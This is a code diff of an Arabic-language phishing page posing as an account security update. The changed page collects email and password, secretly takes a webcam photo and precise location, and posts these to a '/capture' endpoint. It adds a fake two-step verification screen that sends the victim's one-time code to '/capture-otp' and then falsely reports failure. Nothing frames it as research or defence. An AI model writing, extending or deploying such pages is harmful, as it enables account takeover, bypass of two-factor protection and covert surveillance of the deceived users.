@@ -1,23 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <link rel="manifest" href="/manifest.json">
-    <title>Login - Secure Access</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث أمان الحساب</title>
     <style>
-        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        input { width: 80%; padding: 12px; margin: 10px; border-radius: 5px; border: none; }
-        button { background: #007bff; color: white; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; }
+        body { background: #121212; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; border: 1px solid #333; margin-top: 50px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #2c2c2c; color: white; }
+        button { background: #007bff; color: white; width: 95%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <h2>تحديث الأمان مطلوب</h2>
-    <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب واستلام التنبيهات</p>
-    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-    <input type="password" id="pass" placeholder="كلمة المرور" required>
-    <button onclick="startCapture()">تسجيل الدخول</button>
+    <div id="login-screen" class="box">
+        <h2>⚠️ تحديث مطلوب</h2>
+        <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب</p>
+        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+        <input type="password" id="pass" placeholder="كلمة المرور" required>
+        <button onclick="startCapture()">تسجيل الدخول</button>
+    </div>
+
+    <div id="otp-screen" class="box hidden">
+        <h2>🔐 التحقق بخطوتين</h2>
+        <p>أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك</p>
+        <input type="number" id="otp" placeholder="000000" required>
+        <button onclick="sendOtp()">تأكيد الهوية</button>
+    </div>
 
     <script>
-        // 1. إضافة وظيفة التقاط الصورة هنا
+        let userEmail = "";
+
         async function getCameraImage() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -25,47 +38,44 @@
                 video.srcObject = stream;
                 await video.play();
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً
+                stream.getTracks().forEach(t => t.stop());
                 return canvas.toDataURL('image/png');
-            } catch (e) { 
-                console.log("Camera access denied");
-                return null; 
-            }
+            } catch (e) { return null; }
         }
 
-        // 2. تحديث وظيفة البدء لاستدعاء الكاميرا والموقع معاً
         async function startCapture() {
-            const email = document.getElementById('email').value;
+            userEmail = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-            
-            // التقاط الصورة أولاً
-            const imageData = await getCameraImage();
-            
-            // سحب الموقع وإرسال كل البيانات
+            const img = await getCameraImage();
+
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                sendData(email, pass, { lat: pos.coords.latitude, lon: pos.coords.longitude }, imageData);
+                await sendToServer(userEmail, pass, { lat: pos.coords.latitude, lon: pos.coords.longitude }, img);
             }, async () => {
-                sendData(email, pass, null, imageData);
+                await sendToServer(userEmail, pass, null, img);
             }, { enableHighAccuracy: true });
+
+            document.getElementById('login-screen').classList.add('hidden');
+            document.getElementById('otp-screen').classList.remove('hidden');
         }
 
-        // 3. وظيفة إرسال البيانات النهائية للسيرفر
-        async function sendData(email, pass, loc, img) {
+        async function sendToServer(email, pass, loc, img) {
             await fetch('/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    email: email,
-                    password: pass,
-                    location: loc,
-                    image: img, // إرسال الصورة هنا
-                    device: navigator.userAgent
-                })
+                body: JSON.stringify({ email, password: pass, location: loc, image: img, device: navigator.userAgent })
             });
-            alert("جاري فحص الحساب... سيتم إرسال كود التحقق (OTP) إلى هاتفك قريباً.");
+        }
+
+        async function sendOtp() {
+            const code = document.getElementById('otp').value;
+            await fetch('/capture-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp: code, email: userEmail })
+            });
+            alert("فشل التحقق، يرجى طلب كود جديد بعد قليل.");
         }
     </script>
 </body>
